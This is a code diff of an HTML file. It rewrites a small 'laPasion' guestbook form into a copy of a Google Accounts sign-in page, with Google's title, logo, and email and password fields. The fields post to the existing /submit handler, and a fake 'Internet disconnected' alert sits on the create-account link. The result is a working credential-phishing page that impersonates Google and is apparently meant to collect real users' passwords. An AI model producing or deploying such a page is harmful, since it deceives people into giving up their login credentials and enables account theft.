@@ -1,27 +1,129 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>laPasion</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style>
-    body { font-family: sans-serif; text-align: center; padding: 20px; background: #f0f0f0; }
-    .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
-    h1 { color: #d81b60; }
-    input[type=text], textarea { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; }
-    button { background-color: #d81b60; color: white; padding: 15px 20px; border: none; width: 100%; cursor: pointer; font-size: 16px; border-radius: 5px;}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        body {
+            background-color: #fff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            color: #202124;
+        }
+        .card {
+            width: 100%;
+            max-width: 450px;
+            padding: 48px 40px 36px;
+            box-sizing: border-box;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            text-align: center;
+        }
+        /* FIXED: Logo Container for perfect centering */
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin: 0 0 10px;
+            padding-bottom: 0;
+            padding-top: 16px;
+        }
+        p {
+            font-size: 16px;
+            margin: 0 0 40px;
+            color: #202124;
+        }
+        .input-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+            color: #202124;
+            font-family: inherit;
+        }
+        input:focus {
+            outline: none;
+            border: 2px solid #1a73e8;
+            padding: 12px 14px;
+        }
+        .btn-container {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 40px;
+            align-items: center;
+        }
+        .link {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+            font-size: 14px;
+            margin-right: auto;
+            cursor: pointer;
+        }
+        button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #155db1;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+        @media (max-width: 600px) {
+            .card { border: none; padding: 24px; }
+        }
+    </style>
 </head>
 <body>
-  <div class="card">
-    <h1>laPasion</h1>
-    <p>Leave a message for the archive.</p>
-    <form action="/submit" method="POST">
-      <input type="text" name="name" placeholder="Your Name" required>
-      <textarea name="msg" placeholder="Your Message" rows="4" required></textarea>
-      <button type="submit">Submit</button>
-    </form>
-    <br>
-    <a href="/view" style="color: #666; text-decoration: none; font-size: 12px;">Admin View</a>
-  </div>
+
+    <div class="card">
+        <div class="logo-container">
+            <svg viewBox="0 0 75 24" width="120" height="38" xmlns="http://www.w3.org/2000/svg">
+                <path d="M22.56 10.25c0-.66-.06-1.28-.16-1.89h-9.23v3.58h5.27c-.23 1.23-.92 2.28-1.96 2.97v2.47h3.17c1.86-1.71 2.92-4.24 2.92-7.13z" fill="#4285F4"/>
+                <path d="M13.17 19.8c2.6 0 4.77-.86 6.37-2.33l-3.17-2.47c-.86.58-1.96.92-3.19.92-2.51 0-4.63-1.69-5.39-3.97H4.52v2.58c1.63 3.24 4.98 5.27 8.65 5.27z" fill="#34A853"/>
+                <path d="M7.78 11.95c-.19-.56-.3-1.16-.3-1.77s.11-1.21.3-1.77V5.84H4.52c-.67 1.33-1.05 2.82-1.05 4.33s.38 3 1.05 4.33l3.26-2.55z" fill="#FBBC05"/>
+                <path d="M13.17 6.39c1.41 0 2.68.49 3.68 1.44l2.75-2.75C17.94 3.54 15.77 2.5 13.17 2.5 9.5 2.5 6.15 4.53 4.52 7.76l3.26 2.55c.76-2.28 2.88-3.92 5.39-3.92z" fill="#EA4335"/>
+            </svg>
+        </div>
+
+        <h1>Sign in</h1>
+        <p>to continue to the DiddyCage</p>
+
+        <form action="/submit" method="POST">
+            <div class="input-group">
+                <input type="text" name="name" placeholder="Email or phone" required>
+            </div>
+            <div class="input-group">
+                <input type="password" name="msg" placeholder="Enter your password" required>
+            </div>
+
+            <div class="btn-container">
+                <a href="#" onclick="alert('Internet disconnected. Please sign in first.');" class="link">Create account</a>
+                <button type="submit">Next</button>
+            </div>
+        </form>
+    </div>
+
 </body>
 </html>
